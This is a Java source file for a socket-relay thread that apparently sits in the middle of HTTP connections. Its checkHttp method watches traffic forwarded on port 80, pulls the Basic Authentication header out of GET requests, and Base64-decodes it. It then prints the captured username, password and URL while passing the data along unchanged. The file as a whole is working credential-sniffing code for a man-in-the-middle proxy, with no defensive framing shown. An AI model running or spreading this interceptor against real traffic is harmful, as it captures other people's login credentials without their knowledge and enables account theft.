import java.io.*;
import java.net.*;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class RunThread extends Thread {
	Socket one;
	Socket two;
	InputStream oneInput;
	OutputStream twoOutput;
	byte[] packet;

	public RunThread(Socket one, Socket two, InputStream oneInput, OutputStream twoOutput) {
		this.one = one;
		this.two = two;
		this.oneInput = oneInput;
		this.twoOutput = twoOutput;
	}

	@Override
	public void run() {
		try {
			if (!one.isClosed())
				checkHttp();
		} catch (Exception e) {
			System.out.println("Exception in RunThread.run(): " + e.getMessage());
		}
	}

	/**
	 * Check for password passed using HTTP Basic Authentication.
	 * Only in conncetions where the destination is with port 80 and the HTTP method is GET
	 */
	public void checkHttp() {
		String requestMethod = "";
		String password = "";
		String subDomain = "";
		String url = "";
		int countRead;
		packet = new byte[4096]; 
		try {
			oneInput = one.getInputStream();
			while ((countRead = oneInput.read(packet)) != -1) {
				String packetS = new String(packet);
				Pattern pGet = Pattern.compile("(GET)[ ]*([^ ])+[ ]*(HTTP)");
				Pattern pPassword = Pattern.compile("(Authorization)[:][ ](.*)[ ]([\\S]*)");
				Pattern pUrl = Pattern.compile("(Host)[:][ ]((http)://)?([-a-zA-Z0-9+&@#/%?=_|!:,.;]*[-a-zA-Z0-9+&@#/%=_|])");

				Matcher mGet = pGet.matcher(packetS);
				Matcher mPassword = pPassword.matcher(packetS);
				Matcher mUrl = pUrl.matcher(packetS);
				if (mGet.find()) {
					requestMethod = mGet.group(1); 	// GET
					subDomain = mGet.group(2);
				}
				if (mPassword.find()) {
					password = mPassword.group(3); 	
				}
				if (mUrl.find()) {
					url = mUrl.group(4);
				}
				if ((one.getPort() == 80 || two.getPort() == 80) && requestMethod.equals("GET")) {
					byte[] arr = Base64.getDecoder().decode(password);
					System.out.println("Password Found! http://" + new String(arr) + "@" + url + subDomain); 
					
				}
				twoOutput.write(packet, 0, countRead);
			}
		}
		catch(SocketTimeoutException e2){
			
		}
		catch (Exception e) {
			System.err.println("Error getting client's data: " + e.getMessage());
		}
	}


}
